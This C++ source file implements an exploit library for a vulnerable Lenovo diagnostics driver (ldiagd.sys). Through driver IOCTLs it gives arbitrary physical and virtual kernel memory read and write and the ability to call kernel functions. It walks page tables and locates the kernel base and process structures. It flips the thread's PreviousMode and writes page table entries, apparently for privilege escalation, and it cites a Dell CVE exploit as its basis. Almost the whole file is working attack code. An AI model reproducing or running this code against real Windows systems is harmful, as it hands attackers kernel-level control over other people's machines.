/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "LenovoMemoryMgr.h"
#include <conio.h>
#include <iostream>

UINT64 LenovoMemoryMgr::CallKernelFunction(UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4)
{
	if (!address) 
	{
		return -1;
	}

	CALL_DATA call_data;
	memset(&call_data, 0, sizeof(call_data));

	UINT64 call_result = 0;

	call_data.FunctionAddr = address;
	call_data.Arg1 = arg1;
	call_data.Arg2 = arg2;
	call_data.Arg3 = arg3;
	call_data.Arg4 = arg4;
	call_data.CallResult0 = reinterpret_cast<UINT64>(&call_result);
	
	DWORD dwBytesReturned = 0;

	DeviceIoControl
	(
		this->hDevice,
		0x222000,
		&call_data,
		sizeof(CALL_DATA),
		&call_data,
		sizeof(CALL_DATA),
		&dwBytesReturned,
		NULL
	);

	return call_result;
}

template <typename T>
BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
{
    if (!data) {
        return FALSE;
    }

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;
	DWORD64 outbuffer = 0;

	lr.data = address;
	lr.wLen = sizeof(DWORD64);

	bStatus = DeviceIoControl(
		this->hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		&outbuffer,
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	if (!bStatus) {
		return FALSE;
	}

	*data = (T)outbuffer;
    return TRUE;
}

template<typename T>
BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
{
	if (!data && !PhysDest) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	NTSTATUS status = 0;
	BOOL bRes = FALSE;
	LDIAG_WRITE lw = { 0 };
	DWORD dwBytesReturned = 0;

	lw._where = PhysDest;
	lw._what_ptr = (DWORD64)data;
	lw.dwMapSize = (DWORD)sizeof(T);
	lw.dwLo = 0x6C61696E;

	status = DeviceIoControl(
		this->hDevice,
		IOCTL_PHYS_WR,
		&lw,
		sizeof(LDIAG_WRITE),
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);

	return NT_SUCCESS(status);
}

template<typename T>
BOOL LenovoMemoryMgr::ReadVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	if (!this->WritePhysData(this->physSwapAddr, (T*)address)) {
		return FALSE;
	}

	return this->ReadPhysData(this->physSwapAddr, data);
}

template<typename T>
BOOL LenovoMemoryMgr::WriteVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);

	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = this->VtoP(address, pte.flags.Pfn, pt);

	return this->WritePhysData(PhysAddr, data);
}

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/DellBiosUtil.cpp
PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
{
	PFILL_PTE_HIERARCHY retval = new FILL_PTE_HIERARCHY;

	///
	/// Resolve the PTE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PTE = VirtualAddress;

	///
	/// Resolve the PDE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PDE = VirtualAddress;

	///
	/// Resolve the PPE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PPE = VirtualAddress;

	///
	/// Resolve the PXE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PXE = VirtualAddress;

	return retval;
}

UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
{
	UINT64 begin = 0x1000;
	UINT64 end = 0x10000;
	BOOL bRes = FALSE;
	UINT64 val = 0;
	while (begin < end) {
		bRes = this->ReadPhysData<UINT64>(begin, &val);
		if (!bRes) {
			return NULL;
		}

		if (!val) {
			return begin;
		}

		begin += 8;
	}
	return NULL;
}

UINT64 LenovoMemoryMgr::GetPteBase()
{
	const auto address = NtosBase + OFFSET_MI_GET_PTE_ADDRESS + 0x13;
	UINT64 qwPteBase = 0;

	ReadVirtData(address, &qwPteBase);

	return qwPteBase;
}

UINT64 LenovoMemoryMgr::VtoP(UINT64 va, UINT64 index, PageType p)
{
	switch (p) {
	case PageType::UsePte:
		va &= 0xfff;
		break;
	case PageType::UsePde:
		va &= 0x1fffff;
		break;
	default:
		return 0;
	}
	return (index << 12) + va;
}

BOOL LenovoMemoryMgr::SearchPattern(PBYTE pattern, PBYTE mask, DWORD dwPatternSize, UINT64 lpBeginSearch, SIZE_T lenSearch, PUINT64 AddressOfPattern)
{
	SIZE_T szBeginSearch = (SIZE_T)lpBeginSearch;
	BOOL bRes = FALSE;
	BOOL bFound = FALSE;
	for (int i = 0; i < lenSearch; i++) {
		for (unsigned int j = 0; j <= dwPatternSize; j++) {
			// read a byte
			BYTE b = 0;
			if (!this->ReadVirtData<BYTE>((szBeginSearch + i + j), &b)) {
				return FALSE;
			}

			if (j == dwPatternSize) {
				if (bFound)
				{
					*AddressOfPattern = szBeginSearch + i;
					return TRUE;
				}
				return FALSE;
			}

			// skip over if mask says to ignore value or if the byte matches our pattern
			if (mask[j] == '?' || b == pattern[j]) {
				//printf("+");
				bFound = TRUE;
			}
			else {
				//printf("-\n");
				bFound = FALSE;
				break;
			}
		}


	}

	return FALSE;
}

PageType LenovoMemoryMgr::GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry)
{
	// fill the pte hierarchy for the virtual address
	PFILL_PTE_HIERARCHY hierarchy = this->CreatePteHierarchy(VirtAddress);

	// read the PTE contents, if they are zero we are using large pages
	// if the PDE is also zero, god help you
	this->ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);

	if (!PageTableEntry->value) 
	{
		this->ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
		return PageType::UsePde;
	}

	return PageType::UsePte;
}

UINT64 LenovoMemoryMgr::FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

/*
		Todo: ensure our reads aren't crossing a page boundary
*/
_Use_decl_annotations_
UINT64 LenovoMemoryMgr::FindBase(const char* image_name)
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {

		for (int i = 0; i < psm->ModulesCount; i++)
		{
			if (strstr(psm->Modules[i].ImageName, image_name))
			{
				retval = (UINT64)psm->Modules[i].ImageBase;
				break;
			}
		}

		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

UINT64 LenovoMemoryMgr::GetPsInitialSystemProc()
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

UINT64 LenovoMemoryMgr::GetKernelExport(const char* function_name)
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, function_name);
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

BOOL LenovoMemoryMgr::SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess)
{
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
	UINT64 ListHead = ListIter;

	while (TRUE) 
	{
		bRes = ReadVirtData((ListIter + 0x8), &ListIter);

		if (!bRes) 
		{
			return FALSE;
		}

		if (ListIter == ListHead) 
		{
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
		UINT64 IterPid = 0;

		bRes = ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), &IterPid);

		if (!bRes) 
		{
			return FALSE;
		}

		if (IterPid == Pid) 
		{
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 LenovoMemoryMgr::GetPreviousModeAddress()
{
	const auto system_process_ptr = GetPsInitialSystemProc();
	UINT64 system_process = 0;
	ReadVirtData(system_process_ptr, &system_process);

	UINT64 current_process = 0;

	if (SearchEprocessLinksForPid(GetCurrentProcessId(), system_process, &current_process))
	{
		auto thread_head_list = current_process + OFFSET_EPROCESS_THREAD_HEAD_LIST;

		UINT64 ListIter = thread_head_list;
		UINT64 ListHead = ListIter;

		while (TRUE) 
		{
			auto bRes = ReadVirtData((ListIter + 0x8), &ListIter);

			if (!bRes) 
			{
				break;
			}

			if (ListIter == ListHead) 
			{
				break;
			}

			UINT64 iter_thread = ListIter - OFFSET_ETHREAD_LIST_ENTRY;
			UINT64 IterTid = 0;

			bRes = ReadVirtData((iter_thread + OFFSET_ETHREAD_ID), &IterTid);
			
			if (GetCurrentThreadId() == IterTid)
			{
				return iter_thread + OFFSET_ETHREAD_PREVIOUS_MODE;
			}
		}
	}

	return 0;
}

UINT64 LenovoMemoryMgr::GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry)
{
	if (!address) return 0;

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);

	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
	entry = pte;

	if (pt == UsePte)
	{
		return PteHierarchy->PTE;
	}
	else if (pt == UsePde)
	{
		return PteHierarchy->PDE;
	}

	return 0;
}

BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry)
{
	NTSTATUS status = 0;
	BOOL bRes = FALSE;

	const auto ldiagd_address = FindBase("ldiagd.sys");
	const auto address = ldiagd_address + 0x4100;

	WriteVirtData(address, &entry.value);

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);

	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = this->VtoP(address, pte.flags.Pfn, pt);

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;

	lr.data = PhysAddr;
	lr.wLen = sizeof(DWORD64);

	const auto prev_mode_address = GetPreviousModeAddress();

	uint8_t previous_mode = 0;
	WriteVirtData(prev_mode_address, &previous_mode);

	bStatus = DeviceIoControl
	(
		this->hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		reinterpret_cast<void*>(page_table_address),
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	previous_mode = 1;
	WriteVirtData(prev_mode_address, &previous_mode);

	return status;
}

BOOL LenovoMemoryMgr::init()
{
    HANDLE hDev = CreateFileA(
        this->strDeviceName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDev == NULL || hDev == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

	this->NtosBase = this->FindNtosBase();
    this->hDevice = hDev;
	this->physSwapAddr = this->FindPhysSwapSpace();
	this->PteBase = this->GetPteBase();
    return TRUE;
}

BOOL LenovoMemoryMgr::teardown()
{
    CloseHandle(this->hDevice);
    return 0;
}